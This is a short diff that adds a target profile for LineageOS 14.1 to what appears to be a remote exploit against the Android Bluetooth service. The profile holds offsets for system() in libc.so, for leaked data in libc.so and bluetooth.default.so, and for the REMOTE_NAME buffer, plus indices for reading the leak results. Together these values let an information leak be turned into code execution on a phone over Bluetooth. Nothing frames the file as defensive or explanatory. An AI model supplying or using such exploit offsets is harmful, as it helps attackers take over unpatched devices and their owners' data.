@@ -1,0 +1,7 @@
+[lineageos-14-1]
+system_offset = "46b7c"                 # Offset of system in libc.so
+libc_leak_data = "6f25d"                # Offset of leaked data in libc.so
+remote_name_offset = "24869c"           # Offset of REMOTE_NAME in bluetooth.default.so (aligned to 4 bytes -> ARM!)
+bluetooth_leak_data = "fa99f"           # Offset of leaked data in bluetooth.default.so
+libc_leak_idx = [9, 7]                  # Indices of the leaked libc data in the leak result
+bluetooth_leak_idx = [7, 3]             # Indices of the leaked bluetooth data in the leak result
